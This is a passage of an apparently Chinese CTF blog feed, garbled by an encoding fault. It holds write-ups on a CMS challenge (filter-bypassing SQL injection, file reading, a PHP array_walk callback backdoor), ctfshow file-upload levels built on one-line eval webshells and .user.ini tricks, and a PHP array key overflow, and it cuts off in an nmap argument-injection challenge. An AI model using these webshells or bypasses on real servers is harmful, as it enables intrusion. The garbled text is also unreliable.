Browser<br>è¿™ä¸ªé‡Œé¢å€’æ˜¯æ²¡æœ‰ä»€ä¹ˆ</p><p>ä½†æ˜¯å½“æˆ‘å°è¯•è¯»config.phpçš„æ—¶å€™ï¼Œå‘ç°å®ƒæç¤ºåˆ°fileå‚æ•°ä¸èƒ½ä¸ºç©ºï¼Œå¦‚æœæˆ‘å°è¯•è¯»å–ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œä½†æ˜¯ç°åœ¨å®ƒæœ‰æç¤ºï¼Œå°±è¯´è¿™ä¸ªä¸œè¥¿è¢«è¿‡æ»¤äº†ï¼Œåº”è¯¥è¿˜æ˜¯ä¸ç½®æ¢ä¸ºç©ºäº†ï¼Œä½†æ˜¯å½“æˆ‘è¿›è¡ŒåŒå†™ç»•è¿‡çš„æ—¶å€™ï¼Œæç¤ºfileçš„å†…å®¹ä¸èƒ½ä¸ºç©ºï¼Œç¡®å®è®©äººå¥‡æ€ª</p><p>äºæ˜¯æˆ‘è¯»å–äº†antiinject.php</p><pre><code>&lt;?phpfunction antiinject($content)&#123;$keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&#39; &#39;,&quot;&#39;&quot;,&quot;;&quot;,&#39;&quot;&#39;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;);$info=strtolower($content);for($i=0;$i&amp;lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], &#39;&#39;,$info);&#125;return $info;&#125;?&gt;</code></pre><p>è¿™é‡Œé¢æä¾›äº†è¿‡æ»¤æœºåˆ¶ï¼šselect,union,and,from,ç©ºæ ¼ï¼Œâ€™,â€â€,;,char,or,count,master,name,pass,admin,+,-order,=</p><pre><code>&lt;?phpfunction antixss($content)&#123;preg_match(&quot;/(.*)\[a\](.*)\[\/a\](.*)/&quot;,$content,$url);$key=array(&quot;(&quot;,&quot;)&quot;,&quot;&amp;&quot;,&quot;\\&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;&#39;&quot;,&quot;%28&quot;,&quot;%29&quot;,&quot; on&quot;,&quot;data&quot;,&quot;src&quot;,&quot;eval&quot;,&quot;unescape&quot;,&quot;innerHTML&quot;,&quot;document&quot;,&quot;appendChild&quot;,&quot;createElement&quot;,&quot;write&quot;,&quot;String&quot;,&quot;setTimeout&quot;,&quot;cookie&quot;);//å› ä¸ºå¤ªèœï¼Œå¾ˆæ‡’ï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚(è¿‡æ»¤è§„åˆ™æ¥è‡ªMramydnei)$re=$url[2];if(count($url)==0)&#123;return htmlspecialchars($content);&#125;else&#123;for($i=0;$i&amp;lt;=count($key);$i++)&#123;$re=str_replace($key[$i], &#39;_&#39;,$re);&#125;return htmlspecialchars($url[1],ENT_QUOTES).&#39;&lt;a href=&quot;&#39;.$re.&#39;&gt;&#39;.$re.&#39;&lt;/a&gt;&#39;.htmlspecialchars($url[3],ENT_QUOTES);&#125;&#125;</code></pre><p>emmmmmåº”è¯¥æ˜¯xssï¼Œä½†æ˜¯é¢˜ç›®ä¹Ÿæç¤ºè¯´äº†ï¼Œä¸éœ€è¦xssï¼Œäºæ˜¯æˆ‘å…ˆæ”¾å¼ƒäº†ï¼Œç»§ç»­çœ‹ä¸‹å»</p><p>è¯»å–äº†about.php</p><pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?php$file=$_GET[&#39;file&#39;];if($file==&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;//æœç„¶config.phpè¢«è¿‡æ»¤äº†echo &quot;fileå‚æ•°ä¸èƒ½ä¸ºç©ºï¼&quot;;exit();&#125;else&#123;$cut=strchr($file,&quot;loginxlcteam&quot;);if($cut==false)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&#39;æ•æ„Ÿç›®å½•ï¼Œç¦æ­¢æŸ¥çœ‹ï¼ä½†æ˜¯ã€‚ã€‚ã€‚&#39;)&lt;/script&gt;&quot;;&#125;&#125;</code></pre><p>å˜¿å˜¿ç›´æ¥</p><p><img src="11.PNG"></p><p>å˜¿å˜¿ï¼Œä¸‡èƒ½å¯†ç æ²¡æœ‰ç™»ä¸Šå»ï¼Œå…ˆè¯•è¯•è¯»å–say.php</p><pre><code>    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?phpinclude &#39;config.php&#39;;$nice=$_POST[&#39;nice&#39;];$say=$_POST[&#39;usersay&#39;];if(!isset($_COOKIE[&#39;username&#39;]))&#123;setcookie(&#39;username&#39;,$nice);setcookie(&#39;userpass&#39;,&#39;&#39;);&#125;$username=$_COOKIE[&#39;username&#39;];$userpass=$_COOKIE[&#39;userpass&#39;];if($nice==&quot;&quot; || $say==&quot;&quot;)&#123;echo &quot;&lt;script&gt;alert(&#39;æ˜µç§°æˆ–ç•™è¨€å†…å®¹ä¸èƒ½ä¸ºç©ºï¼(å¦‚æœæœ‰å†…å®¹ä¹Ÿå¼¹å‡ºæ­¤æ¡†ï¼Œä¸æ˜¯ç½‘ç«™é—®é¢˜å–”~ å¥½å§ï¼Œç»™ä¸ªæç¤ºï¼šæŸ¥çœ‹é¡µé¢æºç æœ‰æƒŠå–œï¼)&#39;);&lt;/script&gt;&quot;;exit();&#125;$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;ä¸èƒ½è¿æ¥åˆ°æ•°æ®åº“ï¼ï¼&quot;.mysql_error());mysql_select_db($db_name,$con);$nice=mysql_real_escape_string($nice);$username=mysql_real_escape_string($username);$userpass=mysql_real_escape_string($userpass);$result=mysql_query(&quot;SELECT username FROM admin where username=&#39;$nice&#39;&quot;,$con);$login=mysql_query(&quot;SELECT * FROM admin where username=&#39;$username&#39; AND userpass=&#39;$userpass&#39;&quot;,$con);if(mysql_num_rows($result)&gt;0 &amp;amp;&amp;amp; mysql_num_rows($login)&lt;=0)&#123;echo &quot;&lt;script&gt;alert(&#39;æ˜µç§°å·²è¢«ä½¿ç”¨ï¼Œè¯·æ›´æ¢ï¼&#39;);&lt;/script&gt;&quot;;mysql_free_result($login);mysql_free_result($result);mysql_close($con);exit();&#125;mysql_free_result($login);mysql_free_result($result);$say=mysql_real_escape_string($say);mysql_query(&quot;insert into message (nice,say,display) values    (&#39;$nice&#39;,&#39;$say&#39;,0)&quot;,$con);mysql_close($con);echo &#39;&lt;script&gt;alert(&quot;æ„å»ºå’Œè°ç¤¾ä¼šï¼Œç•™è¨€éœ€è¦ç»è¿‡ç®¡ç†å‘˜å®¡æ ¸æ‰å¯ä»¥æ˜¾ç¤ºï¼&quot;);window.location = &quot;./index.php&quot;&lt;/script&gt;&#39;;?&gt;</code></pre><p>ç”±æ­¤çœ‹äº†ï¼Œè¿™ä¸ªç•™è¨€ç‰ˆå°±åªèƒ½è‡ªå·±æ³¨å…¥äº†</p><p>å°è¯•ä¸€ä¸‹fuzz</p><p>ä»€ä¹ˆéƒ½æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç„¶åæˆ‘ä½¿ç”¨adminä½œä¸ºç”¨æˆ·åç™»å½•çš„æ—¶å€™ï¼Œæç¤ºæˆ‘è¯´ï¼Œå¯†ç çš„é•¿åº¦ä¸ä¸€è‡´ï¼Œç‰›å•Šç‰›å•Šï¼Œæˆ‘ä»1è¾“åˆ°20å¤šä¸ª1ï¼Œä¸€ç›´éƒ½æ˜¯é•¿åº¦ä¸ä¸€è‡´</p><p>ç°åœ¨åˆåˆä¸€ä¸ªé—®é¢˜ï¼Œå½“æˆ‘è¾“å…¥adminâ€™ #çš„æ—¶å€™æç¤ºç”¨æˆ·åä¸å­˜åœ¨ï¼Ÿï¼Ÿï¼Ÿ</p><p>ç„¶åçœ‹äº†ä¸€çœ¼WPï¼Œæ„Ÿè§‰è‡ªå·±è¿˜æ˜¯ä¸å¤Ÿç»†å¿ƒï¼Œåˆšæ‰æŠ“åŒ…çš„æ—¶å€™åº”è¯¥å°±åº”è¯¥çœ‹è§å®ƒçš„ç”¨æˆ·åæ˜¯usernameï¼Œå¯†ç æ˜¯namepassï¼Œä¸å°±æ˜¯</p><p><img src="12.PNG"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥æƒ³æ€ä¹ˆæ‰¾åˆ°æ³¨å…¥ç‚¹å§ï¼Œè¿™äº›ä¸œè¥¿çˆ†å‡ºæ¥</p><p>ç„¶åå°±åº”è¯¥æƒ³åˆ°say.phpè¿™é‡Œï¼Œåˆšæ‰ä¹Ÿçœ‹äº†å®ƒæœ‰selectè¿™ç±»ä¸œè¥¿çš„è¿‡æ»¤</p><p><img src="13.PNG"></p><p>ç„¶åæµ‹è¯•å›æ˜¾ç‚¹åœ¨å“ªé‡Œç”¨union selectï¼Œä¸èƒ½ç”¨orderï¼Œå› ä¸ºorä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå®ƒæ˜¯æŒ‰ç…§å…ˆåé¡ºåºè¿›è¡Œè¿‡æ»¤çš„ï¼Œå…ˆæŠŠoræ›¿æ¢ä¸ºç©ºï¼Œç„¶åå†å°†orderæ›¿æ¢ä¸ºç©ºï¼Œå°±ç”¨union selectæ¥è¿›è¡Œã€‚ç„¶åè¿™é‡Œgetåˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯†</p><p><img src="14.PNG"></p><p><img src="15.PNG"></p><p>admin~102 117 99 107 114 117 110 116 117</p><p>ç„¶åå¤©çœŸçš„æˆ‘å°±ç›´æ¥å»ç™»å½•äº†ï¼Œæ²¡æœ‰ä¸æ¯«çš„æ€€ç–‘ï¼Œå°±ä¸æ„Ÿè§‰å¯†ç ä¸å¯¹åŠ²é©¬ï¼ï¼ï¼</p><p>fuckruntu</p><p><img src="17.PNG"></p><p>ç„¶åï¼Œè¿™é“é¢˜è®©æˆ‘çŸ¥é“äº†æˆ‘æ€ç»´æ˜¯æœ‰å¤šä¹ˆçš„ä¸ç¼œå¯†ï¼Œå› ä¸ºå½“æˆ‘çœ‹åˆ°æœ‰æç¤ºè¯´å®ƒå†æ ¹ç›®å½•ä¸‹æ”¾äº†é©¬ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯ç›´æ¥å†urlä¸­æŸ¥çœ‹ï¼Œä½†æ˜¯ç•Œé¢æ˜¯ä¸€ç‰‡ç©ºç™½ï¼Œå°±ã€‚ã€‚ã€‚åº”è¯¥æƒ³åˆ°about.phpé‚£é‡Œçš„é‚£ä¸ª?file,å¯ä»¥ç›´æ¥æŸ¥çœ‹</p><pre><code>&lt;?php$e = $_REQUEST[&#39;www&#39;];$arr = array($_POST[&#39;wtf&#39;] =&gt;&#39;|.*|e&#39;,);array_walk($arr, $e, &#39;&#39;);?&gt;</code></pre><p>çœ‹ä¸æ‡‚ã€‚ã€‚ã€‚</p><p>æŸ¥èµ„æ–™ï¼ŒæŸ¥èµ„æ–™</p><p>array_walk â€” ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ åšå›è°ƒå¤„ç†</p><p>emmmmï¼Œé€šå¸¸è¿™ä¸ªè§£é‡Šæˆ‘æ˜¯çœ‹ä¸æ‡‚çš„ï¼Œå†ç½‘ä¸Šæ‰¾äº†ä¸¤ç¯‡æ–‡ç« æ‹œè¯»äº†ä¸€ä¸‹ï¼Œæ˜¯å…³äºPHPå›è°ƒåé—¨çš„ã€‚</p><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">Pç¥</a></p><p>è¿™ä¸ªä»£ç å’Œpç¥å†™çš„ä¸€æ ·</p><p>array_walkçš„å›è°ƒæ ¼å¼æ˜¯éœ€è¦ä¸‰ä¸ªå‚æ•°çš„</p><blockquote><p>phpä¸­ï¼Œå¯ä»¥æ‰§è¡Œä»£ç çš„å‡½æ•°ï¼š</p></blockquote><blockquote><p>ä¸€ä¸ªå‚æ•°ï¼šassert</p><p>ä¸¤ä¸ªå‚æ•°ï¼šassert ï¼ˆphp5.4.8+ï¼‰</p><p>ä¸‰ä¸ªå‚æ•°ï¼špreg_replace /eæ¨¡å¼</p></blockquote><p>æ‰€ä»¥å¯ä»¥ä½¿ç”¨preg_replace</p><p><a href="http://cms.nuptzj.cn/%E6%81%AD%E5%96%9C%E4%BD%A0%E8%8E%B7%E5%BE%97flag2.txt">http://cms.nuptzj.cn/%E6%81%AD%E5%96%9C%E4%BD%A0%E8%8E%B7%E5%BE%97flag2.txt</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2021/06/01/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/06/01/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>ä»Šå¤©æœ‰ä¸ªæ¯”èµ›ï¼Œbabyæ¯ç¾¤ä¸»è¯´ä»–å‡ºäº†ä¸€é“ç­¾åˆ°é¢˜ï¼Œç„¶è€Œæˆ‘è¿˜æ˜¯åšä¸å‡ºæ¥ï¼Œå‘ç¾¤ä¸»é—®é—®é¢˜çš„æ—¶å€™ï¼Œç¾¤ä¸»çµé­‚ä¸€é—®ï¼Œä½ æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®åˆ·å®Œæ²¡æœ‰ï¼Œä½ åˆ·å®Œå°±ä¼šäº†ï¼Œå¥½çš„ï¼Œèœç‹—é‡æ–°æ»šå›æ¥åˆ·é¢˜äº†</p><span id="more"></span><h2>web 151</h2><p>æç¤ºè¯´å‰å°æ ¡æ£€ä¸å¯é ï¼Œå…¶å®æ„æ€å°±æ˜¯å¦‚æœæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¼šç»è¿‡å‰ç«¯å’Œåç«¯çš„æ ¡ç›‘ï¼Œè¯¶å‘€ï¼Œæ€ä¹ˆæ„Ÿè§‰èƒ½æƒ³å‡ºæ¥æ˜¯ä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯å°±æ˜¯è¯´ä¸å‡ºæ¥</p><p>å†™äº†ä¸€å¥è¯æœ¨é©¬ï¼š<?php eval($_POST[1]);?>,è¯¥åç¼€ä¸ºjpgæç¤ºè¯´ï¼Œåç¼€ä¸å¯¹ã€‚ã€‚ã€‚çœ‹æºç </p><p><img src="1.PNG"></p><p>åªèƒ½æ¥å—pngç»“å°¾çš„</p><p>ä¸Šä¼ å›¾ç‰‡ï¼Œå°†åç¼€æ”¹ä¸º.phpç»“å°¾çš„ï¼Œå¦è€…æˆ‘ä»¬çš„æœ¨é©¬æ²¡æœ‰åŠæ³•æ¯è§£æ</p><p>ç„¶åè®¿é—®upload/1.phpï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œå¾—åˆ°flag</p><p>$flag=â€ctfshow{e669d9fe-f9a0-4b0f-8143-578602bebcfa}â€;</p><h2>web 152</h2><p>æç¤ºè¯´åç«¯æ ¡ç›‘è¦ä¸¥å¯†ï¼Œæœ‰å¯èƒ½å¯¹phpæœ‰äº†ä»€ä¹ˆæ–°çš„è¿‡æ»¤ï¼Ÿå…ˆä¸Šä¼ çœ‹çœ‹</p><p>emmmmmè·Ÿä¸Šä¸€é“é¢˜ç›®ä¸€æ ·</p><h2>web 153</h2><p>ä¾æ—§æ˜¯æç¤ºåç«¯æ ¡éªŒè¦ä¸¥å¯†ï¼Œemmmè¿™æ¬¡ä¸€å®šè¯¥æœ‰è¿‡æ»¤äº†ï¼Œå…ˆä¸Šä¼ è¯•è¯•ã€‚æœç„¶å‡ºé”™äº†ï¼ŒæŠŠåç¼€æ”¹ä¸ºphp3ï¼Œphp5éƒ½å¯ä»¥ã€‚ã€‚ã€‚ã€‚å•Šå•Šå•Šç«Ÿç„¶ä¸å¯ä»¥ï¼Œä¸ºä»€ä¹ˆã€‚ã€‚ã€‚ã€‚ã€‚æˆ‘å·²ç»èœåˆ°åšåˆ°ç¬¬3é¢˜å°±ä¸å¯ä»¥äº†å˜›ã€‚ã€‚ã€‚ã€‚ã€‚å†è¯•è¯•phtml</p><p>åšå‡ºæ¥äº†å˜¿å˜¿ï¼Œ.user.iniå˜¿å˜¿</p><p>å…ˆä¸Šä¼ .user.ini,ç„¶åå†å°†æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬çš„å›¾ç‰‡ä¼ ä¸Šå»ï¼Œå°±å¯ä»¥äº†å˜¿å˜¿å˜¿</p><h2>web 154</h2><p>æç¤ºåˆ°åå°ä¸èƒ½å•äºŒæ ¡éªŒï¼Œå…ˆä¸Šä¼ ï¼ï¼ï¼</p><p>æˆ‘è¯•è¯•ä¸Šä¼ äº†pngï¼šæ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œå¤±è´¥åŸå› ï¼šæ–‡ä»¶å†…å®¹ä¸åˆè§„ï¼Œæ‰€ä»¥å°±æ˜¯æ„Ÿè§‰æ–‡ä»¶å†…å®¹è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å•äºŒæ ¡éªŒå°±æ˜¯è¯´çš„æ˜¯å¯¹æ–‡ä»¶å†…å®¹é­åˆ°äº†è¿‡æ»¤</p><p>æˆ‘åˆšæ‰ç”¨<?=eval($_POST[1]);?>,æˆåŠŸçš„ç»•è¿‡äº†å•äºŒæ ¡éªŒï¼Œä½†æ˜¯ä¸Šä¼ åè¿˜æ˜¯nothing here!</p><p>æˆåŠŸäº†ï¼ï¼ï¼å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œè¿˜æ˜¯è·Ÿä¸Šåˆ°é¢˜ç›®é¢˜ç›®ä¸€æ ·ï¼Œä½†æ˜¯æœ€åå†åé¢ä¸Šä¼ å›¾ç‰‡é‡Œé¢çš„pngé‡Œä¸€å¥è¯æœ¨é©¬ï¼Œåªä¸è¿‡æ˜¯é‡‡ç”¨äº†â€˜=â€™çŸ­æ ‡ç­¾</p><h2>web 155</h2><p>å˜æˆäº†åç«¯çš„å•ä¸‰æ ¡éªŒï¼Œæ„Ÿè§‰emmmmmï¼ŒåŠ æ²¹ä½ å¯ä»¥äº†</p><p>æˆ‘è¯•äº†ä¸€ä¸‹ä¸Šä¼ .user.iniï¼Œå¯ä»¥ä¸Šä¼ </p><p>å°±å¾ˆå¥‡æ€ªï¼Œå› ä¸ºæˆ‘æœ€å¼€å§‹ä¸Šä¼ çš„è¿˜æ˜¯.user.iniå˜›ï¼Œä¸æ˜¯ä¸Šä¼ æˆåŠŸäº†ï¼Œç„¶åæˆ‘å°±å…ˆçœ‹çœ‹upload/å‘ç°å°±ä¸€ç›´æ˜¾ç¤ºé¡µé¢é”™è¯¯ï¼Œç„¶åæˆ‘è¿™é“é¢˜ä»¥å‰ä¸æ˜¯åšå‡ºæ¥äº†Â·å˜›ï¼Œå°±æ„Ÿè§‰è‚¯å®šè¿˜æ˜¯å¯ä»¥åšçš„ï¼Œç„¶åæˆ‘å°±æŠ±ç€è¯•è¯•çš„å¿ƒæ€ï¼Œä¸Šä¼ äº†.pngæ–‡ä»¶ï¼Œæ˜¯pngæ–‡ä»¶ï¼Œæˆ‘åç¼€éƒ½æ²¡æœ‰æ”¹ï¼Œå®ƒç«Ÿç„¶Â·æˆåŠŸäº†ï¼ï¼ï¼ï¼ï¼Ÿï¼Ÿï¼Ÿï¼Ÿæœ‰äº›è®¸è¿·èŒ«</p><p>okç–‘é—®è§£å†³äº†ï¼Œæˆ‘åˆé‡æ–°å¼€äº†ä¸€æ¬¡ç¯å¢ƒï¼Œæœç„¶è¿˜æ˜¯éœ€è¦å…ˆä¸Šä¼ .user.iniå¾—</p><h2>web 156</h2><p>å¥½å®¶ä¼™ï¼Œå˜æˆäº†ä¸èƒ½å•å››æ ¡éªŒ</p><p>å¥½å®¶ä¼™æˆ‘iè¿˜ä»¥ä¸ºæ˜¯å§&lt;?ç»™è¿‡æ»¤äº†ï¼Œæˆ‘è¿˜æƒ³ç€å’‹æï¼Œç©æ„è¿™æ˜¯æŠŠ[]è¿‡æ»¤äº†ï¼Œæœç„¶ctfå¾—æ°´å¤ªæ·±äº†,æˆ‘è¿˜æ˜¯æ…¢æ…¢æŠŠæ¡å§ã€‚ã€‚ã€‚</p><h2>web 157</h2><p>å¥½å®¶ä¼™å¥½å®¶ä¼™ï¼Œä¸èƒ½å•äº”æ ¡éªŒã€‚ã€‚ã€‚ã€‚</p><p>æˆ‘å…ˆè¯•è¯•æˆ‘çœ‹äº†ä¸‹æ˜¯[],{},;è¢«è¿‡æ»¤äº†ï¼Œæˆ‘æœ¬æ¥æƒ³ä½¿ç”¨urlç¼–ç ä½†æ˜¯æ¬¸æœ‰æˆåŠŸï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œæ˜æ˜å¯ä»¥æ˜¾ç¤ºè¿™ä¸ªç•Œé¢ï¼Œä½†æ˜¯æ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾</p><p>aaaaaè¿™é‡Œç”¨åˆ°äº†åå¼•å·ã€‚ã€‚ã€‚è¿˜æ˜¯å¯¹è¿™ä¸ªçŸ¥è¯†ç‚¹ä¸ç†Ÿæ‚‰</p><p>ä¸éœ€è¦ç”¨åˆ°[],ä¹Ÿä¸ä¼šè¦ç”¨åˆ°</p><pre><code>&lt;?=`ls`?&gt;</code></pre><h2>web 158</h2><p>emmmmå•å…­æ ¡éªŒ</p><p>å…¶å®å°±æ˜¯è¯´æˆ‘è¯•äº†ä¸€ä¸‹åº”è¯¥æ˜¯flag.phpä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå°±ç›´æ¥</p><pre><code>&lt;?=`cat ../f*`?&gt;å°±å¯ä»¥äº†</code></pre><h2>web 159</h2><p>åŒä¸Š</p><p>å®Œè›‹ï¼Œåå¼•å·è¢«ç¦ç”¨äº†ï¼Œçªç„¶æ„Ÿè§‰åˆ°è¿™ç©¶ç«Ÿæ˜¯å…³äºæ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡ï¼Œè¿˜æ˜¯å‘½ä»¤æ‰§è¡Œå•Šï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php-keyæº¢å‡º</title>
      <link href="/2021/05/31/php-key%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/05/31/php-key%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>èœç‹—åªä¼šè¿™ä¸€é“ï¼Œè¿˜æ˜¯åœ¨å¤§ä½¬çš„æç¤ºä¸‹åšå‡ºæ¥çš„ï¼Œä½†æ˜¯ç‹—çš„æ˜¯ç€é¢˜æœ€åè¿˜æ•´äº†å›¾ç‰‡åˆ†ç¦»ï¼Ÿï¼Ÿï¼Ÿ</p><span id="more"></span><p>æºç </p><pre><code>&lt;?php        $six_number = $_POST[&#39;webp&#39;];        $a = $_POST[&#39;a&#39;];        $b = $_POST[&#39;b&#39;];        $c = $_POST[&#39;c&#39;];        if (md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39; &amp;&amp; md5($a) === md5($b) &amp;&amp; $a !== $b) &#123;            if($array[++$c]=1)&#123;                if($array[]=1)&#123;                    echo &quot;nonono&quot;;                &#125;                else&#123;                    require_once &#39;flag.php&#39;;                    echo $flag;                &#125;            &#125;        &#125; </code></pre><p>å‰é¢çš„æŒºå¥½ç»•è¿‡çš„ï¼Œå°±é‚£ä¸ªMD5åŠ å¯†çš„è¯åœ¨ç½‘ç«™ä¸Šè§£å¯†å°±å¯ä»¥è§£å‡ºæ¥ï¼Œæˆ–è€…è‡ªå·±å†™ä¸ªè„šæœ¬å°±å¯ä»¥</p><pre><code>import hashlibfor i in range(100000,999999):s1 = str(i)m = hashlib.md5()#åˆ›å»ºä¸€ä¸ªmd5çš„å¯¹è±¡m.update(s1.encode(&quot;utf-8&quot;))#è¿›è¡Œmd5ç¼–ç if(m.hexdigest()==&quot;e10adc3949ba59abbe56e057f20f883e&quot;):   print(i)</code></pre><p>åé¢å“ªä¸ªå°±æ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œè§çš„ä¹Ÿæ¯”è¾ƒå¤šäº†æ•°ç»„ç»•è¿‡a[]=1&amp;&amp;b[]=2</p><p>åŸç†å°±æ˜¯ï¼šmd5å¼ºæ¯”è¾ƒï¼Œæ­¤æ—¶å¦‚æœä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•°ç»„ï¼Œmd5()å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼ï¼Œè€Œä¸”ä¸ä¼šæŠ¥é”™ï¼Œå°±ä¼šå¾—åˆ°===å¼ºæ¯”è¾ƒçš„å€¼ç›¸ç­‰</p><p>æˆåŠŸç»•è¿‡ä¹‹åæˆ‘ä»¬è¿›å…¥ç¬¬äºŒé˜¶æ®µ</p><p>é‚£å°±å…ˆå°†çŸ¥è¯†ç‚¹å§</p><p>å…ˆç»™å‡ºä¸€ä¸ªkeyæº¢å‡ºçš„ä¾‹å­ï¼š</p><p><img src="1.PNG"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“keyå€¼æ¯”è¾ƒå°æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå½“keyå€¼å¾ˆå¤§çš„æ—¶è¾“å‡ºçš„å€¼æº¢å‡ºäº†ï¼Œä¸´ç•Œç‚¹æ˜¯9223372036854775807ï¼Œä½†æ˜¯æˆ‘åœ¨æƒ³çš„æ˜¯ä¸ºä»€ä¹ˆåªæœ‰åœ¨ä¸´ç•Œç‚¹çš„æ—¶å€™æ‰å¯ä»¥ç»•è¿‡</p><p><img src="2.PNG"></p><p>æˆ‘ä»¬çœ‹åˆ°è™½ç„¶æŠ¥é”™äº†ï¼Œä½†æ˜¯å°±é¥¶è¿‡äº†èµ‹å€¼è¿™ä¸ªé™åˆ¶</p><p><img src="3.PNG"></p><p>çœ‹ä¸‹æŠ¥é”™æ˜¾ç¤ºçš„ä¿¡æ¯ï¼š</p><p>PHP Warning:  Cannot add element to the array as the next element is already occupied in /home/lucky/æ¡Œé¢/1.php on line 9</p><p>æç¤ºè¯´æ— æ³•å°†å…ƒç´ æ·»åŠ åˆ°æ•°ç»„ä¸­ï¼Œå› ä¸ºä¸‹ä¸€ä¸ªå…ƒç´ å·²è¢«å ç”¨</p><p>æƒ³ä¸€ä¸‹ï¼Œ$array[]=1å…¶å®å°±æ˜¯ç›¸å½“äºç»™$array[0]èµ‹å€¼ï¼Œå¦‚æœæˆåŠŸèµ‹å€¼åˆ™ä½†æ˜¯å°±ä¸ºtrueï¼Œå°±è¿›å…¥åˆ°äº†ifé‡Œé¢ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰æˆåŠŸèµ‹å€¼å°±ä¸ºfalseï¼Œè¿›å…¥åˆ°elseé‡Œé¢</p><p>emmmä¸æƒ³æ‰¾äº†ï¼Œæ„Ÿè§‰æº¢å‡ºå°±æ˜¯æŠŠ$array[]çš„å€¼ç»™å äº†ï¼Œå¦‚æœå°†$array[1]å°±ä¸ä¼šæº¢å‡º</p><p>åé¢å°±ç›´æ¥miscéšå†™</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>online-tool</title>
      <link href="/2021/05/30/online-tool/"/>
      <url>/2021/05/30/online-tool/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>ç®€å•çš„çœ‹äº†ä¸€ä¸‹è¿™ä¸ªæ˜¯nmapè¿™ä¸ªå·¥å…·ï¼Œå®³ï¼Œè¿™å‡ å¤©å¯¹è€æ˜¯ä½¿ç”¨nmapï¼Œè¿™å›è¿˜èƒ½ç¢°ä¸Šä¹Ÿæ˜¯æ²¡è°äº†ã€‚</p><p>åˆ†æä»£ç </p><pre><code>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;$_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;</code></pre><p>è·å–ipï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™$_SERVER[â€˜REMOTE_ADDRâ€™]ï¼Œæµè§ˆå½“å‰ç½‘é¡µæ‰€ä½¿ç”¨çš„IP</p><pre><code>if(!isset($_GET[&#39;host&#39;])) &#123;highlight_file(__FILE__);&#125; else &#123;$host = $_GET[&#39;host&#39;];$host = escapeshellarg($host);$host = escapeshellcmd($host);$sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);echo &#39;you are in sandbox &#39;.$sandbox;@mkdir($sandbox);chdir($sandbox);echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125;</code></pre><p>escapeshellargï¼šç¡®ä¿ç”¨æˆ·åªèƒ½ä¼ 